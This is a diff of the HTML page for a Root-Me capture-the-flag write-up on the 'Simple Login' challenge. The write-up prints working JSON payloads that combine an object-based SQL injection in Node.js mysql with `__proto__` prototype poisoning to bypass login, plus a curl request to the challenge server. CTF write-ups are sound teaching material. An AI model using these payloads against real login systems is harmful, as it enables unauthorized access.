@@ -4,12 +4,13 @@
         <meta charset="utf-8">
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <meta name="robots" content="noodp" />
-        <title>Writeup - Root-Me CTF 10k - Simple Login - Root-Me Blog</title><meta name="Description" content="Root Me allows everyone to test and improve their knowledge in computer security and hacking. Legal. Free. Realistic"><meta property="og:title" content="Writeup - Root-Me CTF 10k - Simple Login" />
+        <title>Writeup - Root-Me CTF 10k - Simple Login - Root-Me Blog</title><meta name="Description" content="Root Me allows everyone to test and improve their knowledge in computer security and hacking. Legal. Free. Realistic."><meta property="og:title" content="Writeup - Root-Me CTF 10k - Simple Login" />
 <meta property="og:description" content="Writeup of the &lsquo;Simple Login&rsquo; challenge during the Root-Me CTF 10k" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://blog.root-me.org/posts/writeup_ctf10k_simple_login/" />
+<meta property="og:url" content="https://blog.root-me.org/posts/writeup_ctf10k_simple_login/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2023-03-02T00:00:00+00:00" />
 <meta property="article:modified_time" content="2023-03-02T00:00:00+00:00" /><meta property="og:site_name" content="Root-Me Blog" />
+
 <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Writeup - Root-Me CTF 10k - Simple Login"/>
 <meta name="twitter:description" content="Writeup of the &lsquo;Simple Login&rsquo; challenge during the Root-Me CTF 10k"/>
@@ -27,7 +28,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https:\/\/blog.root-me.org\/posts\/writeup_ctf10k_simple_login\/"
-        },"genre": "posts","keywords": "writeups, CTF10k, SQLi, Challenge, Prototype Poisoning","wordcount":  762 ,
+        },"genre": "posts","keywords": "writeups, CTF10k, SQLi, Challenge, Prototype Poisoning","wordcount":  736 ,
         "url": "https:\/\/blog.root-me.org\/posts\/writeup_ctf10k_simple_login\/","datePublished": "2023-03-02T00:00:00+00:00","dateModified": "2023-03-02T00:00:00+00:00","publisher": {
             "@type": "Organization",
             "name": ""},"author": {
@@ -41,7 +42,14 @@
         <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
     <div class="header-wrapper">
         <div class="header-title">
-            <a href="/" title="Root-Me Blog">Root-Me Blog</a>
+            <a href="/" title="Root-Me Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://www.root-me.org/IMG/logo/siteon0.svg"
+        data-srcset="https://www.root-me.org/IMG/logo/siteon0.svg, https://www.root-me.org/IMG/logo/siteon0.svg 1.5x, https://www.root-me.org/IMG/logo/siteon0.svg 2x"
+        data-sizes="auto"
+        alt="https://www.root-me.org/IMG/logo/siteon0.svg"
+        title="https://www.root-me.org/IMG/logo/siteon0.svg" />Root-Me Blog</a>
         </div>
         <div class="menu">
             <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
@@ -53,7 +61,14 @@
     <div class="header-container">
         <div class="header-wrapper">
             <div class="header-title">
-                <a href="/" title="Root-Me Blog">Root-Me Blog</a>
+                <a href="/" title="Root-Me Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://www.root-me.org/IMG/logo/siteon0.svg"
+        data-srcset="https://www.root-me.org/IMG/logo/siteon0.svg, https://www.root-me.org/IMG/logo/siteon0.svg 1.5x, https://www.root-me.org/IMG/logo/siteon0.svg 2x"
+        data-sizes="auto"
+        alt="https://www.root-me.org/IMG/logo/siteon0.svg"
+        title="https://www.root-me.org/IMG/logo/siteon0.svg" />Root-Me Blog</a>
             </div>
             <div class="menu-toggle" id="menu-toggle-mobile">
                 <span></span><span></span><span></span>
@@ -69,7 +84,7 @@
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Writeup - Root-Me CTF 10k - Simple Login</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="https://www.root-me.org/Mizu" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Kévin_Mizu</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeups/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Writeups</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-03-02">2023-03-02</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;762 words&nbsp;
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-03-02">2023-03-02</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;736 words&nbsp;
                 <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;</div>
         </div><div class="details toc" id="toc-static"  data-kept="">
                 <div class="details-summary toc-title">
@@ -101,7 +116,7 @@
 <hr>
 <h2 id="-recon">🕵️ Recon</h2>
 <p>For this challenge, we had access to the source code. So, the first step was to take a look at the features that the app has to offer to us:</p>
-<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="kd">var</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express&#39;</span><span class="p">);</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="kd">var</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express&#39;</span><span class="p">);</span>
 <span class="kd">var</span> <span class="nx">path</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;path&#39;</span><span class="p">);</span>
 <span class="kd">var</span> <span class="nx">mysql</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;mysql&#39;</span><span class="p">);</span>
 
@@ -157,17 +172,17 @@
 <h2 id="-sql-injection">💉 SQL Injection</h2>
 <p>At first glance, the code might look safe because it uses a prepared query but that&rsquo;s not true with the nodeJS&rsquo;s <code>mysql</code> library! In fact, has well described in this article (<a href="https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4" target="_blank" rel="noopener noreffer ">link</a>), the nodeJS&rsquo;s <code>mysql</code> library will parse inputs differently based on their type if <code>stringifyObjects: true</code> isn&rsquo;t used for the MySQL connection. (even for prepared query)</p>
 <p>The vulnerability occur when an object is used, for example:</p>
-<div class="highlight"><pre class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
     <span class="nt">&#34;username&#34;</span><span class="p">:</span> <span class="s2">&#34;admin&#34;</span><span class="p">,</span>
     <span class="nt">&#34;password&#34;</span><span class="p">:</span> <span class="p">{</span>
         <span class="nt">&#34;password&#34;</span><span class="p">:</span> <span class="mi">1</span>
     <span class="p">}</span>
 <span class="p">}</span>
 </code></pre></div><p>In the query:</p>
-<div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="k">user</span> <span class="o">=</span> <span class="o">?</span> <span class="k">and</span> <span class="n">password</span> <span class="o">=</span> <span class="o">?</span>
-</code></pre></div><p>Will become:</p>
-<div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="k">user</span> <span class="o">=</span> <span class="s2">&#34;admin&#34;</span> <span class="k">and</span> <span class="n">password</span> <span class="o">=</span> <span class="o">`</span><span class="n">password</span><span class="o">`</span> <span class="o">=</span> <span class="mi">1</span>
-</code></pre></div><p>As you can see, the object is split into a double equality. This is a huge problem because, in MySQL <code>password</code> is the same as <code>password</code> which gives us <code>1 = 1</code> which is <code>True</code>. Thus, sending this object will allow us to bypass the authentification.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">?</span><span class="w">
+</span></code></pre></div><p>Will become:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&#34;admin&#34;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">`</span><span class="n">password</span><span class="o">`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="w">
+</span></code></pre></div><p>As you can see, the object is split into a double equality. This is a huge problem because, in MySQL <code>password</code> is the same as <code>password</code> which gives us <code>1 = 1</code> which is <code>True</code>. Thus, sending this object will allow us to bypass the authentification.</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
@@ -178,12 +193,12 @@
         title="meme.jpg" /></p>
 <h2 id="-prototype-poisoning">🏭 Prototype Poisoning</h2>
 <p>At this point, we could think that we just have to send our payload to be able to get the flag but, in the source code we can see that if <code>username</code> or <code>password</code> is an Object then the server will return <code>Attack detected!</code>&hellip; 🥲</p>
-<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">credentials</span><span class="p">.</span><span class="nx">user</span> <span class="o">===</span> <span class="s2">&#34;object&#34;</span><span class="p">)</span> <span class="p">{</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">credentials</span><span class="p">.</span><span class="nx">user</span> <span class="o">===</span> <span class="s2">&#34;object&#34;</span><span class="p">)</span> <span class="p">{</span>
     <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;Attack detected!&#34;</span><span class="p">,</span> <span class="mi">400</span><span class="p">);</span>
 <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">credentials</span><span class="p">.</span><span class="nx">password</span> <span class="o">===</span> <span class="s2">&#34;object&#34;</span><span class="p">)</span> <span class="p">{</span>
     <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;Attack detected!&#34;</span><span class="p">,</span> <span class="mi">400</span><span class="p">);</span>
 </code></pre></div><p>At this point, we could think to be out of options and this challenge is absolutly impossible but that where <code>Prototype Poisoning</code> comes! If we look closer at the code, we could see that the flag is added using <code>assign</code> function to our object.</p>
-<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="nx">credentials</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">assign</span><span class="p">({</span><span class="s2">&#34;flag&#34;</span><span class="o">:</span> <span class="s2">&#34;RM{fake-flag}&#34;</span><span class="p">},</span> <span class="nx">credentials</span><span class="p">)</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="nx">credentials</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">assign</span><span class="p">({</span><span class="s2">&#34;flag&#34;</span><span class="o">:</span> <span class="s2">&#34;RM{fake-flag}&#34;</span><span class="p">},</span> <span class="nx">credentials</span><span class="p">)</span>
 </code></pre></div><p>This function is quite interesting as it will merge all attributes of the 2nd object into the first one. (<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/assign" target="_blank" rel="noopener noreffer ">source</a>)</p>
 <p>This could be abused to poison the prototype of the credentials Object, via  <code>__proto__</code>.</p>
 <p>What is the difference between Prototype Pollution and Prototype Poisonning?</p>
@@ -194,7 +209,7 @@
 As you can see, it&rsquo;s just a matter of impact :p</li>
 </ul>
 <p>Thus, if we place the password inside the prototype, it will check for <code>credentials.password</code> which is <code>null</code> at the time of the verification and just after, poison the prototype with our payload making it accessible from <code>credentials.password</code> when the SQL query occur.</p>
-<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="kd">var</span> <span class="nx">credentials</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="kd">var</span> <span class="nx">credentials</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span>
 
 <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">credentials</span><span class="p">.</span><span class="nx">user</span> <span class="o">===</span> <span class="s2">&#34;object&#34;</span><span class="p">)</span> <span class="p">{</span>
     <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;Attack detected!&#34;</span><span class="p">,</span> <span class="mi">400</span><span class="p">);</span>
@@ -206,7 +221,7 @@ As you can see, it&rsquo;s just a matter of impact :p</li>
 
     <span class="kd">var</span> <span class="nx">sql</span> <span class="o">=</span> <span class="s2">&#34;SELECT ? AS FLAG FROM users WHERE user = ? AND password = ?&#34;</span><span class="p">;</span>
 </code></pre></div><p>Payload:</p>
-<div class="highlight"><pre class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
     <span class="nt">&#34;user&#34;</span><span class="p">:</span> <span class="s2">&#34;admin&#34;</span><span class="p">,</span>
         <span class="nt">&#34;__proto__&#34;</span><span class="p">:</span>
     <span class="p">{</span>
@@ -217,7 +232,7 @@ As you can see, it&rsquo;s just a matter of impact :p</li>
 <span class="p">}</span>
 </code></pre></div><h2 id="-flag">🎉 Flag</h2>
 <p>Now that we have all keys to get the flag, we just need to send the following JSON to the server:</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">curl -X POST http://ctf10k.root-me.org:6004/auth <span class="se">\
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">curl -X POST http://ctf10k.root-me.org:6004/auth <span class="se">\
 </span><span class="se"></span>  -H <span class="s1">&#39;content-type: application/json&#39;</span> <span class="se">\
 </span><span class="se"></span>  -d <span class="s1">&#39;{
 </span><span class="s1">    &#34;user&#34;: &#34;admin&#34;,
